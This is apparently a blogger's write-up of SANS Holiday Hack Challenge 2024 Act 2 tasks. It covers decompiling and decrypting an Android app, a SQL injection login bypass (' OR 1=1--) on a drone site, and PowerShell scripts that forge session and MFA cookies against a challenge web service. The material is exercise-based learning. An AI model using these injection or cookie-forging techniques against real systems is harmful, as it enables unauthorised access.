---
title: The Front Yard - Act 2
date: 2024-11-24 12:00:00 -500
categories: [HHC24,SANS]
tags: [Hacking,CTF,SANS,HHC24]

---

> [!quote] The foolish man seeks happiness in the distance, the wise grows it under his feet.
> — James Oppenheim

---

## The Front Yard - Act 2

![[Pasted image 20241124180457.png]]



Gathering intel


![[Pasted image 20241124181809.png]]

![[Pasted image 20241124181916.png]]

![[Pasted image 20241124181934.png]]

![[Pasted image 20241124182319.png]]


![[Pasted image 20241124182450.png]]


---

## The Great Elf Conflict


![[Pasted image 20241124182908.png]]

![[Pasted image 20241124182936.png]]

![[Pasted image 20241124183012.png]]
![[Pasted image 20241124183034.png]]
![[Pasted image 20241124183049.png]]
![[Pasted image 20241124183107.png]]

![[Pasted image 20241124183118.png]]
![[Pasted image 20241124183131.png]]


![[Pasted image 20241124183156.png]]

https://kc7cyber.com/go/hhc24




---

## Mobile Analysis 

![[Pasted image 20241124181211.png]]


But here’s my tiny reindeer-sized problem: I made a [debug](https://www.holidayhackchallenge.com/2024/SantaSwipe.apk) version and a [release](https://www.holidayhackchallenge.com/2024/SantaSwipeSecure.aab) version of the app.

![[Pasted image 20241124181342.png]]![[Pasted image 20241124181351.png]]

Try using [apktool](https://github.com/iBotPeaches/Apktool/releases) or [jadx](https://github.com/skylot/jadx)

![[Pasted image 20241124184937.png]]

So yeah, have you heard about this new [Android app](https://developer.android.com/guide/app-bundle/app-bundle-format) format? Want to [convert it to an APK](https://github.com/HackJJ/apk-sherlock/blob/main/aab2apk.md) file?

Obfuscated and encrypted? Hmph. Shame you can't just run [strings](https://developer.android.com/guide/topics/resources/string-resource) on the file.

Step 1: Download Apktool

Go to the official Apktool releases page.

Step2: Install Java

```shell
sudo apt install openjdk-11-jre
```

```shell
java -version
```


Step 3: create the apktool file 

```shell
vim apktool
```


```bash
#!/bin/sh
java -jar /usr/local/bin/apktool.jar "$@"
```


Step 4: Move the files to bin

```bash
sudo mv apktool-X.X.X.jar /usr/local/bin/apktool<version>.jar
sudo mv apktool /usr/local/bin/apktool
```


```bash
apktool
```

Step 5: Run the apktool to decompile the debug software

```bash
apktool d ~/Downloads/SantaSwipe.apk -o ~/HHC24 -f
```


Start digging

![[Pasted image 20241124192511.png]]

apktool did not debug and create file structure at output location maybe its somewhere else 

i used jadx instead

`apt install jadx`

```shell
jadx -d ~/HHC24 ~/Downloads/SantaSwipeDebug.apk 
```

ran into more errors so used -v flag. Moved on to jadx-gui

![[Pasted image 20241124195629.png]]

```shell
@Override // android.database.sqlite.SQLiteOpenHelper
    public void onCreate(SQLiteDatabase db) {
        Intrinsics.checkNotNullParameter(db, "db");
        db.execSQL("CREATE TABLE IF NOT EXISTS NiceList (Item TEXT);");
        db.execSQL("CREATE TABLE IF NOT EXISTS NaughtyList (Item TEXT);");
        db.execSQL("CREATE TABLE IF NOT EXISTS NormalList (Item TEXT);");
        db.execSQL("DELETE FROM NiceList;");
        db.execSQL("DELETE FROM NaughtyList;");
        db.execSQL("DELETE FROM NormalList;");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Carlos, Madrid, Spain');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Aiko, Tokyo, Japan');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Maria, Rio de Janeiro, Brazil');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Liam, Dublin, Ireland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Emma, New York, USA');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Chen, Beijing, China');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Fatima, Casablanca, Morocco');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Hans, Berlin, Germany');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Olga, Moscow, Russia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ravi, Mumbai, India');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Amelia, Sydney, Australia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Juan, Buenos Aires, Argentina');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Sofia, Rome, Italy');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ahmed, Cairo, Egypt');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Yuna, Seoul, South Korea');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ellie, Alabama, USA');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Lucas, Paris, France');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Mia, Toronto, Canada');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Sara, Stockholm, Sweden');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ali, Tehran, Iran');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Nina, Lima, Peru');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Anna, Vienna, Austria');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Leo, Helsinki, Finland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Elena, Athens, Greece');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Davi, Sao Paulo, Brazil');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Marta, Warsaw, Poland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Noah, Zurich, Switzerland');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ibrahim, Ankara, Turkey');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Emily, Wellington, New Zealand');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Omar, Oslo, Norway');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Fatou, Dakar, Senegal');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Olivia, Vancouver, Canada');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ethan, Cape Town, South Africa');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Santiago, Bogota, Colombia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Isabella, Barcelona, Spain');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ming, Shanghai, China');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Chloe, Singapore, Singapore');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Mohammed, Dubai, UAE');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Ava, Melbourne, Australia');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Luca, Milan, Italy');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Sakura, Kyoto, Japan');");
        db.execSQL("INSERT INTO NormalList (Item) VALUES ('Edward, New Jersey, USA');");
    }
```

The Naughty-Nice List
```json
('Carlos, Madrid, Spain');");
('Aiko, Tokyo, Japan');");
('Maria, Rio de Janeiro, Brazil');");
('Liam, Dublin, Ireland');");
('Emma, New York, USA');");
('Chen, Beijing, China');");
('Fatima, Casablanca, Morocco');");
('Hans, Berlin, Germany');");
('Olga, Moscow, Russia');");
('Ravi, Mumbai, India');");
('Amelia, Sydney, Australia');");
('Juan, Buenos Aires, Argentina');");
('Sofia, Rome, Italy');");
('Ahmed, Cairo, Egypt');");
('Yuna, Seoul, South Korea');");
('Ellie, Alabama, USA');");
('Lucas, Paris, France');");
('Mia, Toronto, Canada');");
('Sara, Stockholm, Sweden');");
('Ali, Tehran, Iran');");
('Nina, Lima, Peru');");
('Anna, Vienna, Austria');");
('Leo, Helsinki, Finland');");
('Elena, Athens, Greece');");
('Davi, Sao Paulo, Brazil');");
('Marta, Warsaw, Poland');");
('Noah, Zurich, Switzerland');");
('Ibrahim, Ankara, Turkey');");
('Emily, Wellington, New Zealand');");
('Omar, Oslo, Norway');");
('Fatou, Dakar, Senegal');");
('Olivia, Vancouver, Canada');");
('Ethan, Cape Town, South Africa');");
('Santiago, Bogota, Colombia');");
('Isabella, Barcelona, Spain');");
('Ming, Shanghai, China');");
('Chloe, Singapore, Singapore');");
('Mohammed, Dubai, UAE');");
('Ava, Melbourne, Australia');");
('Luca, Milan, Italy');");
('Sakura, Kyoto, Japan');");
('Edward, New Jersey, USA');");
```
Looked back on the SELECT Statement that was reading from the normal list DB and found a reference to where not like %ELLIE% SMH it was so easy. I saw this before but just ignored it. Shout out to Mr.J for DMing me and helping me backtrack just like the hint says. 

### Gold Solve 

Ok, install jadx-gui 

Convert aab to apk using aab2apk above sign cert as described above using buildtools

Thanks to a hint from orangepeelbeef i scored realized where to look to find the strings.xml file. The search feature was not finding this resource when i looked way back from the beggining.

Strange business there. Also i couldnt get jadx command line working correctly so gui was the way to go here. 

Once i found the IV and EK I created a python script

```python
from base64 import b64decode
from Crypto.Cipher import AES

def decrypt_base64_strings(base64_strings, key, iv):
    """
    Decrypt a list of Base64 strings using AES/GCM.
    
    Args:
        base64_strings (list): List of Base64-encoded ciphertexts.
        key (bytes): AES key (binary).
        iv (bytes): AES initialization vector (binary).
        
    Returns:
        list: Decrypted plaintext strings.
    """
    decrypted_strings = []
    
    for base64_string in base64_strings:
        try:
            # Decode the Base64-encoded ciphertext
            ciphertext = b64decode(base64_string)
            
            # Create AES cipher in GCM mode
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            
            # Decrypt the ciphertext
            plaintext = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
            
            # Decode plaintext to string
            decrypted_strings.append(plaintext.decode('utf-8'))
        
        except Exception as e:
            print(f"Failed to decrypt: {base64_string}")
            print(f"Error: {e}")
            decrypted_strings.append(None)
    
    return decrypted_strings

# Example usage:
if __name__ == "__main__":
    # Replace with your Base64-encoded AES key and IV
    base64_key = "rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw="
    base64_iv = "Q2hlY2tNYXRlcml4"
    
    # Decode key and IV
    key = b64decode(base64_key)
    iv = b64decode(base64_iv)
    
    # List of Base64-encoded strings to decrypt list was way bigger
    base64_strings = [
  "L2HD1a45w7EtSN41J7kx/hRgPwR8lDBg9qUicgz1qhRgSg==", "IWna1u1qu/4LUNVrbpd8riZ+w9oZNN1sPRS2ujQpMqAAt114Yw==", "MWfO0+M1t5IvQtN2ad9w3hp81sYQIIaX6veq03bnk6I4H/1n89gW", "LmHJ164506skXdh3K9MZ/BBiw90TRO2mD0Hp9Nuoxu4ghx5/WQ=="
    ]
    
    # Decrypt the strings
    decrypted = decrypt_base64_strings(base64_strings, key, iv)
    for i, plaintext in enumerate(decrypted):
        print(f"Decrypted string {i+1}: {plaintext}")
from base64 import b64decode
from Crypto.Cipher import AES

def decrypt_base64_strings(base64_strings, key, iv):
    """
    Decrypt a list of Base64 strings using AES/GCM.
    
    Args:
        base64_strings (list): List of Base64-encoded ciphertexts.
        key (bytes): AES key (binary).
        iv (bytes): AES initialization vector (binary).
        
    Returns:
        list: Decrypted plaintext strings.
    """
    decrypted_strings = []
    
    for base64_string in base64_strings:
        try:
            # Decode the Base64-encoded ciphertext
            ciphertext = b64decode(base64_string)
            
            # Create AES cipher in GCM mode
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            
            # Decrypt the ciphertext
            plaintext = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
            
            # Decode plaintext to string
            decrypted_strings.append(plaintext.decode('utf-8'))
        
        except Exception as e:
            print(f"Failed to decrypt: {base64_string}")
            print(f"Error: {e}")
            decrypted_strings.append(None)
    
    return decrypted_strings

# Example usage:
if __name__ == "__main__":
    # Replace with your Base64-encoded AES key and IV
    base64_key = "rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw="
    base64_iv = "Q2hlY2tNYXRlcml4"
    
    # Decode key and IV
    key = b64decode(base64_key)
    iv = b64decode(base64_iv)
    
    # List of Base64-encoded strings to decrypt
    base64_strings = [
  "L2HD1a45w7EtSN41J7kx/hRgPwR8lDBg9qUicgz1qhRgSg==", "IWna1u1qu/4LUNVrbpd8riZ+w9oZNN1sPRS2ujQpMqAAt114Yw==", 
    ]
    
    # Decrypt the strings
    decrypted = decrypt_base64_strings(base64_strings, key, iv)
    for i, plaintext in enumerate(decrypted):
        print(f"Decrypted string {i+1}: {plaintext}")

```

![[Pasted image 20241125200134.png]]

Alright this outputs the users list but i need to go a step further and decode the decrypt function to expose the Create string.

![[Pasted image 20241125200128.png]]

```python
    base64_strings = [
  "IVrt+9Zct4oUePZeQqFwyhBix8cSCIxtsa+lJZkMNpNFBgoHeJlwp73l2oyEh1Y6AfqnfH7gcU9Yfov6u70cUA2/OwcxVt7Ubdn0UD2kImNsclEQ9M8PpnevBX3mXlW2QnH8+Q+SC7JaMUc9CIvxB2HYQG2JujQf6skpVaPAKGxfLqDj+2UyTAVLoeUlQjc18swZVtTQO7Zwe6sTCYlrw7GpFXCAuI6Ex29gfeVIeB7pK7M4kZGy3OIaFxfTdevCoTMwkoPvJuRupA6ybp36vmLLMXaAWsrDHRUbKfE6UKvGoC9d5vqmKeIO9elASuagxjBJ"
    ]
```

![[Pasted image 20241125200118.png]]

```python
    base64_strings = [
  "KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8="
    ]
```

`Decrypted string 1: Joshua, Birmingham, United Kingdom`


![[Pasted image 20241125200422.png]]


---

## Snowball Showdown

![[Pasted image 20241124181714.png]]


![[Pasted image 20241124181609.png]]

![[Pasted image 20241124181634.png]]
![[Pasted image 20241124181644.png]]


---

## Drone Path

![[Pasted image 20241124183839.png]]

![[Pasted image 20241124183851.png]]

![[Pasted image 20241124184051.png]]

![[Pasted image 20241124184011.png]]


Grab XML file from site 

![[Pasted image 20241125202653.png]]

Add the kml file to earth

![[Pasted image 20241125202622.png]]


![[Pasted image 20241125202736.png]]

{"username":"fritjolf","password":"GUMDROP1"}

![[Pasted image 20241125221252.png]]

![[Pasted image 20241125221127.png]]

https://hhc24-dronepath.holidayhackchallenge.com/files/secret/Preparations-drone-name.csv

![[Pasted image 20241125221514.png]]

Used sqlmap for days with no avail WAF must be slapping it down real nice. 

Basic sql injection works here not like two years ago's sqli challenge.
```sql
' OR 1=1--
```

![[Pasted image 20241126125357.png]]


![[Pasted image 20241126130059.png]]


![[Pasted image 20241126130123.png]]

![[Pasted image 20241126130152.png]]

Google earth cant figure out how to do flat earth view in google earth

![[Pasted image 20241126132028.png]]

Ran it through folium 

```python
import pandas as pd
import folium
from folium import plugins

def create_enhanced_map(data, output_filename='drone_flight.html'):
    try:
        # Extract valid GPS coordinates and relevant data
        required_columns = ['OSD.latitude', 'OSD.longitude', 'OSD.height [ft]', 
                          'BATTERY.chargeLevel [%]', 'OSD.hSpeedMax [MPH]', 'OSD.flyTime [s]']
        coordinates = data[required_columns].dropna()
        
        if coordinates.empty:
            print("No valid GPS data available to create map.")
            return

        # Get center point for map
        center_lat = coordinates['OSD.latitude'].mean()
        center_lon = coordinates['OSD.longitude'].mean()

        # Create the map
        m = folium.Map(location=[center_lat, center_lon], zoom_start=16)

        # Create the flight path line
        path_coordinates = coordinates[['OSD.latitude', 'OSD.longitude']].values.tolist()
        folium.PolyLine(
            path_coordinates,
            weight=3,
            color='blue',
            opacity=0.8
        ).add_to(m)

        # Add markers with enhanced data points (every 10th point to avoid overcrowding)
        point_interval = 10
        for i, row in coordinates.iterrows():
            if i % point_interval == 0:
                # Create formatted popup content
                popup_html = f"""
                <div style="font-family: Arial, sans-serif; min-width: 180px;">
                    <h4 style="margin-bottom: 10px;">Flight Data Point {i}</h4>
                    <table style="width: 100%; border-collapse: collapse;">
                        <tr style="background-color: #f2f2f2;">
                            <td style="padding: 5px;"><b>Altitude:</b></td>
                            <td style="padding: 5px;">{row['OSD.height [ft]']:.1f} ft</td>
                        </tr>
                        <tr>
                            <td style="padding: 5px;"><b>Battery:</b></td>
                            <td style="padding: 5px;">{row['BATTERY.chargeLevel [%]']:.1f}%</td>
                        </tr>
                        <tr style="background-color: #f2f2f2;">
                            <td style="padding: 5px;"><b>Speed:</b></td>
                            <td style="padding: 5px;">{row['OSD.hSpeedMax [MPH]']:.1f} MPH</td>
                        </tr>
                        <tr>
                            <td style="padding: 5px;"><b>Flight Time:</b></td>
                            <td style="padding: 5px;">{row['OSD.flyTime [s]']:.1f} s</td>
                        </tr>
                    </table>
                </div>
                """

                # Create marker with popup
                folium.CircleMarker(
                    location=[row['OSD.latitude'], row['OSD.longitude']],
                    radius=6,
                    color='red',
                    fill=True,
                    popup=folium.Popup(popup_html, max_width=300),
                    tooltip=f"Data Point {i}"
                ).add_to(m)

        # Add start and end markers
        # Start point (green)
        first_row = coordinates.iloc[0]
        folium.Marker(
            [first_row['OSD.latitude'], first_row['OSD.longitude']],
            popup='Start',
            icon=folium.Icon(color='green', icon='info-sign')
        ).add_to(m)

        # End point (red)
        last_row = coordinates.iloc[-1]
        folium.Marker(
            [last_row['OSD.latitude'], last_row['OSD.longitude']],
            popup='End',
            icon=folium.Icon(color='red', icon='info-sign')
        ).add_to(m)

        # Add a minimap
        minimap = plugins.MiniMap()
        m.add_child(minimap)

        # Add fullscreen option
        plugins.Fullscreen().add_to(m)

        # Add mouse position
        plugins.MousePosition().add_to(m)

        # Add a measure control
        plugins.MeasureControl(position='topleft').add_to(m)

        # Save the map
        m.save(output_filename)
        print(f"Enhanced flight map saved as '{output_filename}'")
        
    except Exception as e:
        print(f"Error creating map: {str(e)}")

# Main execution
try:
    # Load data
    file_path = r"C:\Users\hecki\Downloads\ELF-HAWK-dump.csv"
    df = pd.read_csv(file_path)
    
    # Clean data
    df = df.replace(['NULL', 'N/A', '', ' '], None)
    
    # Convert numeric columns
    numeric_cols = ['OSD.height [ft]', 'OSD.hSpeedMax [MPH]', 'OSD.flyTime [s]', 
                   'BATTERY.chargeLevel [%]', 'OSD.latitude', 'OSD.longitude']
    for col in numeric_cols:
        if col in df.columns:
            df[col] = pd.to_numeric(df[col], errors='coerce')
    
    # Create enhanced map
    create_enhanced_map(df)
    
except Exception as e:
    print(f"Error in main execution: {str(e)}")
```


![[Pasted image 20241126131948.png]]

```json
DroneDataAnalystExpertMedal
```
![[Pasted image 20241126132155.png]]

![[Pasted image 20241126132206.png]]

![[Pasted image 20241126132327.png]]

![[Pasted image 20241126132351.png]]

![[Pasted image 20241126172107.png]]

```json
EXPERTTURKEYCARVERMEDAL
```

![[Pasted image 20241126172348.png]]
![[Pasted image 20241126172338.png]]


---

## Powershell


![[Pasted image 20241124182609.png]]


![[Pasted image 20241124182731.png]]

![[Pasted image 20241124182741.png]]


![[Pasted image 20241126172939.png]]

![[Pasted image 20241126173044.png]]

```powershell
GET-Content welcome.txt
```

![[Pasted image 20241126173346.png]]

![[Pasted image 20241126173333.png]]


The 'Measure-Object' cmdlet can help you count the words. Use `Get-Help Measure-Object` for more information.


![[Pasted image 20241126174401.png]]

```powershell
GET-Content welcome.txt | Measure-Object -Line -Word -Character
```

![[Pasted image 20241126174429.png]]

![[Pasted image 20241126174645.png]]


```powershell
netstat -pantu
```

![[Pasted image 20241126174731.png]]

![[Pasted image 20241126175003.png]]

```powershell
(Invoke-WebRequest -Uri "http://127.0.0.1:1225").StatusCode
```

![[Pasted image 20241126175020.png]]

![[Pasted image 20241126175322.png]]

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Credential (Get-Credential -UserName "admin" -Message "admin") -AllowUnencryptedAuthentication  
```


![[Pasted image 20241126175546.png]]
![[Pasted image 20241126175353.png]]


```powershell
1..100 | ForEach-Object { $url = "http://localhost:1225/endpoints/$_"; $content = Invoke-WebRequest -Uri $url -UseBasicParsing; if (($content.Content -split '\s+').Count -eq 138) { $output = "Page with 138 words: $url`n$content.Content"; $output | Out-File -FilePath "output.txt" -Encoding UTF8; break } }
```

```powershell
GET-Content ./output.txt
```

![[Pasted image 20241126180223.png]]

Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv

```powershell
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Credential (Get-Credential -Credential $Credential) -AllowUnencryptedAuthentication; $response.Content
```

![[Pasted image 20241126180453.png]]

```powershell
# Path to your file
$filePath = "file.txt"

# Number of lines to output at a time
$chunkSize = 30

# Read file and process in chunks
Get-Content $filePath | ForEach-Object -Begin { $counter = 0 } -Process {
    $counter++
    Write-Output $_

    # Output a blank line every $chunkSize lines for separation
    if ($counter % $chunkSize -eq 0) {
        Write-Output "Press Enter to continue..."
        Read-Host
    }
}
```



![[Pasted image 20241126180509.png]]

```powershell
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/<sha256sum>" -Credential (Get-Credential -Credential $Credential) -AllowUnencryptedAuthentication -OutFile "token_file.txt"; Get-Content "token_file.txt"
```

![[Pasted image 20241126180745.png]]

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/<sha256sum>" -WebSession $session -Method GET; $session.Cookies.GetAllCookies() | ForEach-Object { Write-Host "Cookie: $($_.Name)=$($_.Value)" }
```

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Credential (Get-Credential -UserName "admin" -Message "Enter password") -AllowUnencryptedAuthentication
```

```powershell
$username = "admin" # Replace with your actual username 
$password = ConvertTo-SecureString "admin" -AsPlainText -Force # Replace with your actual password 
$Credential = New-Object System.Management.Automation.PSCredential($username, $password)
```


```text
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

```powershell
# Step 1: Create a WebRequestSession object
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Step 2: Add the 'token' cookie with value 'admin'
$cookie = New-Object System.Net.Cookie
$cookie.Name = "token"
$cookie.Value = "5f8dd236f862f4507835b0e418907ffc" # Setting the cookie value to 'admin'
$cookie.Domain = "127.0.0.1" # Adjust if the domain differs
$webSession.Cookies.Add($cookie)

# Step 3: Make the request with the cookie set
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" `
							  -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication

# Step 4: Output the response content
$response.Content
```

![[Pasted image 20241126210343.png]]

![[Pasted image 20241126210355.png]]

![[Pasted image 20241126210407.png]]



```powershell
# Step 1: Create a WebRequestSession object
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Step 2: Add the original 'token' cookie
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = "5f8dd236f862f4507835b0e418907ffc"
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

# Step 3: Add the 'mfa_token' cookie (fixed name)
$mfaCookie = New-Object System.Net.Cookie
$mfaCookie.Name = "mfa_token"  # Changed from mfa_code to mfa_token
$mfaCookie.Value = "1732680036.6350784"
$mfaCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($mfaCookie)

# Step 4: Make the request with both cookies set
$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" `
                             -Method GET `
                             -WebSession $webSession `
                             -Credential $Credential `
                             -AllowUnencryptedAuthentication

# Step 5: Output the response content
$response.Content
```



```powershell
# Step 1: First request to get the MFA token
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = "5f8dd236f862f4507835b0e418907ffc"
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication

# Extract the MFA value from the response
$mfaValue = $response1.Content -replace '.*?href=''([^'']+)''.*', '$1'

# Step 2: Immediately send the validation request with both tokens
$mfaCookie = New-Object System.Net.Cookie
$mfaCookie.Name = "mfa_token"
$mfaCookie.Value = $mfaValue
$mfaCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($mfaCookie)

$response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication

$response2.Content
```

![[Pasted image 20241126210857.png]]


```powershell
<h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==</p>
```

![[Pasted image 20241126211025.png]]



```powershell
$base64Value = "Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="

$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Value))
Write-Host "Decoded message: $decoded"
```

![[Pasted image 20241126211212.png]]

```text
SnowLeopard2ReadyForAction
```

![[Pasted image 20241126211300.png]]

![[Pasted image 20241126211203.png]]

![[Pasted image 20241126211359.png]]

![[Pasted image 20241126211412.png]]
![[Pasted image 20241126211422.png]]
![[Pasted image 20241126211434.png]]

![[Pasted image 20241126211507.png]]

![[Pasted image 20241126211518.png]]

```text
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```

![[Pasted image 20241126224318.png]]

```powershell
# Step 1: First request to get the MFA token
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = $md5Value  # Your provided MD5 hash
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$($sha256Hash.Hash)" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication
```


```shell
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
